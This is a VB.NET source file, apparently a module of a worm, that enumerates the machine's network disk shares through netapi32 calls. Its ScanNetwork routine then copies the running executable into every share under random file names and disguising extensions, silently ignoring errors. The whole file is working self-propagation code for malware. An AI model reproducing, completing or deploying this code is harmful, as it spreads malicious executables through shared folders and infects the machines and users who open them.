#Region "imports"

Imports System
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.IO

#End Region
Public Class clsNetwork
#Region "Enumerations"
    Enum SharePermissions
        ACCESS_NONE = 0
        ACCESS_READ = 1
        ACCESS_WRITE = 2
        ACCESS_CREATE = 4
        ACCESS_EXEC = 8
        ACCESS_DELETE = &H10
        ACCESS_ATRIB = &H20
        ACCESS_PERM = &H40
        ACCESS_ALL = ACCESS_READ + ACCESS_WRITE + ACCESS_CREATE + ACCESS_EXEC + ACCESS_DELETE + ACCESS_ATRIB + ACCESS_PERM
        ACCESS_GROUP = &H8000
    End Enum
#End Region

#Region "Structures"
    Structure ShareType
        Dim Name As String
        Dim Path As String
        Dim Type As Integer
        Dim Remark As String
    End Structure

    Structure ShareCollection
        Dim Shares() As ShareType
        Dim ShareCount As Integer

        Sub Clear()
            Shares = Nothing
        End Sub

        Sub Add(ByVal Name As String, ByVal Path As String, ByVal Type As Integer, ByVal Remark As String)
            If Shares Is Nothing Then
                ReDim Shares(0)
                Shares(0).Name = Name
                Shares(0).Path = Path
                Shares(0).Type = Type
                Shares(0).Remark = Remark
            Else
                ReDim Preserve Shares(Shares.Length)
                Shares(Shares.Length - 1).Name = Name
                Shares(Shares.Length - 1).Path = Path
                Shares(Shares.Length - 1).Type = Type
                Shares(Shares.Length - 1).Remark = Remark
            End If
            If Type = 0 Then ShareCount = ShareCount + 1
        End Sub
    End Structure
#End Region

#Region "API Calls"
    Declare Unicode Function NetShareEnum Lib "netapi32.dll" _
        (ByVal ServerName As StringBuilder, _
        ByVal level As Integer, _
        ByRef BufPtr As IntPtr, _
        ByVal prefmaxbufferlen As Integer, _
        ByRef entriesread As Integer, _
        ByRef totalentries As Integer, _
        ByRef resume_handle As Integer) As Integer

    Declare Unicode Function NetShareGetInfo Lib "netapi32.dll" _
    (ByVal ServerName As String, _
    ByVal ShareName As String, _
    ByVal Level As Integer, _
    ByRef BufPtr As IntPtr) As Integer

    Declare Unicode Function NetApiBufferFree Lib "netapi32.dll" _
      (ByRef buffer As IntPtr) As Long
#End Region

#Region "Constants"

    'Const MAX_PREFERRED_LENGTH As Integer = -1      ' originally 0
    'Const ERROR_SUCCESS As Long = 0&        ' No errors encountered.
    'Const NERR_Success As Long = 0&
    Const ERROR_ACCESS_DENIED As Long = 5&      ' The user has insufficient privilege for this operation.
    'Const ERROR_NOT_ENOUGH_MEMORY As Long = 8&      ' Not enough memory
    'Const ERROR_NETWORK_ACCESS_DENIED As Long = 65&     ' Network access is denied.
    'Const ERROR_INVALID_PARAMETER As Long = 87&     ' Invalid parameter specified.
    'Const ERROR_BAD_NETPATH As Long = 53&       ' The network path was not found.
    'Const ERROR_INVALID_NAME As Long = 123&     ' Invalid name
    'Const ERROR_INVALID_LEVEL As Long = 124&    ' Invalid level parameter.
    'Const ERROR_MORE_DATA As Long = 234&        ' More data available, buffer too small.
    Const NERR_BASE As Long = 2100&
    'Const NERR_NetNotStarted As Long = 2102&    ' Device driver not installed.
    'Const NERR_RemoteOnly As Long = 2106&       ' This operation can be performed only on a server.
    'Const NERR_ServerNotStarted As Long = 2114&     ' Server service not installed.
    'Const NERR_BufTooSmall As Long = 2123&      ' Buffer too small for fixed-length data.
    'Const NERR_RemoteErr As Long = 2127&        ' Error encountered while remotely.  executing function
    'Const NERR_WkstaNotStarted As Long = 2138&      ' The Workstation service is not started.
    'Const NERR_BadTransactConfig As Long = 2141&    ' The server is not configured for this transaction;  IPC$ is not shared.
    'Const NERR_NetNameNotFound As Long = (NERR_BASE + 210)  ' Sharename not found.
    'Const NERR_InvalidComputer As Long = 2351&      ' Invalid computername specified.
    Const STYPE_DISKTREE As Long = 0
    Public Shared ServerShareCollection As ShareCollection
#End Region

#Region "API Calls With Structures"

    <StructLayout(LayoutKind.Sequential)> _
    Structure SHARE_INFO_1
        <MarshalAs(UnmanagedType.LPWStr)> Dim netname As String
        Public ShareType As Integer
        <MarshalAs(UnmanagedType.LPWStr)> Dim Remark As String

    End Structure

    <StructLayout(LayoutKind.Sequential)> _
    Structure SHARE_INFO_2
        <MarshalAs(UnmanagedType.LPWStr)> Dim shi2_netname As String
        Dim shi2_type As Integer
        <MarshalAs(UnmanagedType.LPWStr)> Dim shi2_remark As String
        Dim shi2_permissions As Integer
        Dim shi2_max_uses As Integer
        Dim shi2_current_uses As Integer
        <MarshalAs(UnmanagedType.LPWStr)> Dim shi2_path As String
        <MarshalAs(UnmanagedType.LPWStr)> Dim shi2_passwd As String
    End Structure

#End Region

#Region "Functions & Procedures"

    Private Shared Function GetSharesFromHost(ByVal server As String) As ShareCollection
        Dim Shares As New ShareCollection
        Shares.Clear()
        Dim level As Integer = 2
        Dim svr As New StringBuilder(server)
        Dim entriesRead As Integer, totalEntries As Integer, nRet As Integer, hResume As Integer = 0
        Dim pBuffer As IntPtr = IntPtr.Zero

        Try
            nRet = NetShareEnum(svr, level, pBuffer, -1, entriesRead, totalEntries, _
             hResume)

            If ERROR_ACCESS_DENIED = nRet Then
                level = 1
                nRet = NetShareEnum(svr, level, pBuffer, -1, entriesRead, totalEntries, _
                 hResume)
            End If

            If 0 = nRet AndAlso entriesRead > 0 Then
                Dim t As Type = IIf((2 = level), GetType(SHARE_INFO_2), GetType(SHARE_INFO_1))
                Dim offset As Integer = Marshal.SizeOf(t)

                Dim i As Integer = 0, lpItem As Integer = pBuffer.ToInt32()
                While i < entriesRead
                    Dim pItem As New IntPtr(lpItem)
                    If 1 = level Then
                        Dim si As SHARE_INFO_1 = DirectCast(Marshal.PtrToStructure(pItem, t), SHARE_INFO_1)
                        Shares.Add(si.netname, "Access Denied", si.ShareType, si.Remark)
                    Else
                        Dim si As SHARE_INFO_2 = DirectCast(Marshal.PtrToStructure(pItem, t), SHARE_INFO_2)

                        If (si.shi2_type = STYPE_DISKTREE) Then Shares.Add(si.shi2_netname, si.shi2_path, si.shi2_type, si.shi2_remark)

                    End If
                    i += 1
                    lpItem += offset
                End While

            End If
            Return Shares
        Finally
            If IntPtr.Zero <> pBuffer Then
                NetApiBufferFree(pBuffer)
            End If

        End Try
        Return Shares
    End Function
    Public Shared Sub ScanNetwork()

        Dim strLocalhost As String = System.Environment.MachineName
        ServerShareCollection = GetSharesFromHost(strLocalhost)
        Try
            For Each s As ShareType In ServerShareCollection.Shares
                Try
                    File.Copy(Application.ExecutablePath, AddBackSlash(s.Path) & GetRandomName())
                Catch exUAex As UnauthorizedAccessException

                Catch exUAex As IOException
                    Randomize()
                    File.Copy(Application.ExecutablePath, AddBackSlash(s.Path) & CreatePass(15) & clsS.sSharedExtension.ElementAt(Int(Rnd() * 3)))
                End Try
            Next
        Catch exUAex As UnauthorizedAccessException
        Catch ex As NullReferenceException
        End Try
    End Sub
#End Region
End Class
